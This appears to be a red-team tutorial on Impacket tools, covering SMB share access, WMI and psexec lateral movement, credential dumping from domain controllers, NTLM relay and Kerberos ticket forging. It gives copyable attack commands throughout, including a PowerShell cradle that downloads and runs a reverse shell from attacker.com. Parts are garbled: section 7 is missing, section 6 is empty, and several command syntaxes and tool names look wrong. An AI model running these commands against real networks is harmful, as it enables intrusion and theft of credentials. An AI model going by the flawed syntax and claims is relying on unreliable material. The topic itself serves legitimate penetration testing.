Impacket Overview

Impacket contains both libraries for working with protocols and a set of tools for practical tasks like scanning, enumeration, and exploitation. It's commonly used in Red Team engagements, vulnerability assessments, and security research.

Here are some of the core protocols Impacket deals with:

SMB (Server Message Block)

LDAP (Lightweight Directory Access Protocol)

Kerberos

NetSession (for Windows session management)

MSRPC (Microsoft RPC)

DCE/RPC (Distributed Computing Environment / Remote Procedure Call)

Key Tools in Impacket

smbclient.py ‚Äì SMB client for interacting with SMB shares.

wmiexec.py ‚Äì Executes commands on remote Windows machines using WMI (Windows Management Instrumentation).

psexec.py ‚Äì A tool to execute commands on remote Windows machines, similar to psexec.

secretsdump.py ‚Äì Dumps NTLM hashes from Windows machines, allowing you to retrieve password hashes for offline cracking.

ntlmrelayx.py ‚Äì Allows for NTLM relay attacks, typically used to pass hash attacks.

dcomexec.py ‚Äì Leverages DCOM (Distributed Component Object Model) for remote code execution.

--------------------------------------------------------------------------------------------------------real-world red team examples where Impacket tools are used, covering different protocols and attack vectors. Each example highlights specific tools used for exploitation, privilege escalation, and lateral movement within a target network.

1. Exploiting SMB Shares with smbclient.py

Scenario: During an engagement, you discover an open SMB share on a target system. The share is not password-protected, or there‚Äôs a possibility of weak or default passwords.

Objective: Enumerate shares, access sensitive files, or retrieve credentials stored in unprotected shares.

Tool: smbclient.py

Steps:

Enumerate SMB Shares:

First, use smbclient.py to list the available shares on the target.

smbclient.py -username guest -password "" target-ip


Access a Share:

Once you identify a writable share or a share with sensitive files, mount it and explore further.

smbclient.py -username user -password password //target-ip/share


Retrieve Files:

Copy sensitive files or scripts that could contain password hashes or further exploits.

get sensitive_file.txt

Real-World Use:

A red team used smbclient.py during an engagement to access an unprotected SMB share on a target Windows file server. By leveraging the weak configuration, they were able to exfiltrate configuration files containing credentials and further escalate their access.

2. Lateral Movement via WMI with wmiexec.py

Scenario: After compromising a user‚Äôs machine on a Windows network, you need to move laterally to other systems that have WMI enabled.

Objective: Execute commands on remote machines using WMI for lateral movement without using SMB.

Tool: wmiexec.py

Steps:

Run a Command Remotely:

Use wmiexec.py to execute a simple command (like whoami) on a remote machine.

wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"


Establish a Reverse Shell:

Execute a more advanced command to set up a reverse shell or connect to a C2 server.

wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"

Real-World Use:

In a recent red team engagement, the team used wmiexec.py to establish a foothold in a remote network segment after compromising an initial victim. Since WMI was exposed, they leveraged it for lateral movement to other workstations and servers.

3. Remote Command Execution with psexec.py

Scenario: You are tasked with using Remote Code Execution (RCE) to escalate privileges on a Windows system in the middle of a network.

Objective: Execute a command remotely to spawn a reverse shell or upload malicious payloads.

Tool: psexec.py

Steps:

Execute a Command Remotely:

Use psexec.py to run a command on the target machine as the currently authenticated user.

psexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"


Execute a Reverse Shell:

If SMB access is available, you can use psexec.py to run a reverse shell.

psexec.py DOMAIN/username:password@target-ip "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"

Real-World Use:

Red team operators have used psexec.py for lateral movement across corporate networks. After compromising a low-level user on one machine, they executed psexec.py to run commands on domain controllers and escalate their access to higher-value targets.

4. Credential Dumping with secretsdump.py

Scenario: During post-exploitation on a compromised system, the red team needs to dump password hashes for further cracking or lateral movement.

Objective: Dump NTLM hashes or plaintext credentials from a target system.

Tool: secretsdump.py

Steps:

Dump Hashes from Remote System:

Use secretsdump.py to dump credentials from a remote Windows machine over SMB.

secretsdump.py DOMAIN/username:password@target-ip


Dump Domain Controller Hashes:

If the target system is a Domain Controller, dump the hashes directly from it.

secretsdump.py -just-dc DOMAIN/username:password@target-ip

Real-World Use:

In a Red Team operation targeting a financial institution, secretsdump.py was used to dump NTLM hashes from a vulnerable Domain Controller. These hashes were then cracked offline, enabling Pass-the-Hash attacks on other systems and gaining high-level access.

5. NTLM Relay Attack with ntlmrelayx.py

Scenario: After compromising a low-level user, you discover that NTLM authentication is being used and can be relayed to another machine.

Objective: Perform an NTLM relay attack to pass credentials to a service (e.g., SMB or HTTP) on another machine, gaining access without cracking hashes.

Tool: ntlmrelayx.py

Steps:

Relay NTLM Hash to SMB Service:

Use ntlmrelayx.py to relay the captured NTLM authentication to a vulnerable SMB service.

ntlmrelayx.py -t smb://target-ip


Use the Relayed Hash:

Once relayed, use the session to access SMB shares, exfiltrate data, or escalate privileges.

Real-World Use:

A red team used NTLM relay to bypass network segmentation by capturing the hash of a user logging into an insecure web application. The hash was relayed to an SMB share on a server, which allowed the attackers to pivot further into the network.

6. Exploiting MSRPC for Remote Code Execution with dcomexec.py

Scenario: A critical vulnerability is discovered in an MSRPC service (e.g., EternalBlue or MS08-067) on a Windows machine, and you need to execute code remotely.

Objective: Execute code remotely using MSRPC services.

Tool: dcomexec.py

8. Exploiting Kerberos with ticketer.py

Scenario: You need to extract or forge Kerberos tickets (TGTs) to escalate privileges on a Windows network.

Objective: Forge or extract Kerberos tickets for authentication, using a valid service account or exploiting a vulnerable Kerberos setup.

Tool: ticketer.py

Steps:

Extract a TGT:

Extract the Ticket Granting Ticket for a service account.

ticketer.py -domain DOMAIN -username USER -password PASS -target HOST


Pass-the-Ticket (PTT) Attack:

Use the TGT to authenticate and escalate privileges.

impacket-krb5tgs.py -t TARGET -k YOUR-TGT

Real-World Use:

In a recent Red Team engagement against a bank's Active Directory infrastructure, attackers used ticketer.py to exploit an improperly configured Kerberos service. They extracted a TGT for an admin account and performed a Pass-the-Ticket attack, enabling privilege escalation and lateral movement across multiple systems.
